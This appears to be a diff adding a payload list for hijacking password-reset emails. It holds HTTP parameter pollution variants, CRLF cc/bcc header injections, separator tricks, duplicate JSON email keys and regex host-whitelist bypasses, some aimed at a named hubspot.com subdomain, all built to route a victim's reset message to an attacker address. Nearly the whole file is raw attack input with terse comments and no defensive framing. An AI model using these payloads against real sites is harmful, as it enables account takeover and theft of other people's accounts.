@@ -1,0 +1,72 @@
+"email"="attacker@gmail.com"
+"email"="attacker@gmail.com%0a"
+
+# parameter pollution
+email=victim@mail.com&email=attacker@mail.com
+
+# array of emails
+{"email":["victim@mail.com","attacker@mail.com"]}
+
+# carbon copy
+email=victim@mail.com%0A%0Dcc:attacker@mail.com
+email=victim@mail.com%0A%0Dbcc:attacker@mail.com
+
+# separator
+email=victim@mail.com,attacker@mail.com
+email=victim@mail.com%20attacker@mail.com
+email=victim@mail.com|attacker@mail.com
+
+
+email=victim@gmail.com&email=attacker@gmail.com
+email=victim@gmail.com%0a%0dcc:attacker@gmail.com
+{"email":["victim@gmail.com","attacker@gmail.com"]}
+email=victim@gmail.com,attacker@gmail.com
+email=victim@gmail.com|attacker@gmail.com
+email=victim@gmail.com%20attacker@gmail.com
+
+
+# Regex Bypass
+growanz.hubspot.com.mydomain.com
+# Weak regex by using dot on regex without bypassing it e.g
+# for regex: ”^growanz.hubspot.com$|^example.virtual.host$”
+growanzXhubspot.com
+mydomain.com/growanz.hubspot.com
+
+mydomain.com%23@growanz.hubspot.com
+mydomain.com%25%32%33@growanz.hubspot.com
+
+# check double parameter and see which one gets used or both
+email=victim@gmail.com&email=attacker@gmail.com
+
+# HTTP parameter pollution
+// Comma saperator with HPP chain
+{"email":"Victim@gmail.com,Attacker@gmail.com","email":"Victim@gmail.com"}
+{"email":"Victim@gmail.com","email":"Victim@gmail.com,Attacker@gmail.com"}
+// Semiclon saperator with HPP chain
+{"email":"Victim@gmail.com;Attacker@gmail.com","email":"Victim@gmail.com"}
+{"email":"Victim@gmail.com","email":"Victim@gmail.com;Attacker@gmail.com"}
+// Space saperator with HPP chain
+{"email":"Victim@gmail.com%20Attacker@gmail.com","email":"Victim@gmail.com"}
+{"email":"Victim@gmail.com","email":"Victim@gmail.com%20Attacker@gmail.com"}
+# Linux system
+// Carbon Copy (CC:) with HPP chain
+{"email":"Victim@mail.com%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
+{"email":"Victim@mail.com","email":"Victim@mail.com%0Acc:Attacker@mail.com"}
+// Blind Carbon Copy (BCC:) with HPP chain
+{"email": "Victim@mail.com%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
+{"email":"Victim@mail.com","email":"Victim@mail.com%0Abcc:Attacker@mail.com"}
+# window system
+// Carbon Copy (CC:) with HPP chain
+{"email":"Victim@mail.com%0D%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
+{"email":"Victim@mail.com","email":"Victim@mail.com%0D%0Acc:Attacker@mail.com"}
+// Blind Carbon Copy (BCC:) with HPP chain
+{"email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
+{"email":"Victim@mail.com","email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com"}
+
+# to to subject email header bypass
+// HPP chain with Bypass the mail() function protection against email header injection
+{"email":"Victim@mail.com\r\n \ncc: Attacker@mail.com","email":"Victim@mail.com"}
+{"email":"Victim@mail.com","email":"Victim@mail.com\r\n \ncc: Attacker@mail.com"}
+
+# change the content type of the request `Content-Type: text/html`
+"From: reset-password@hubspot.com" in header
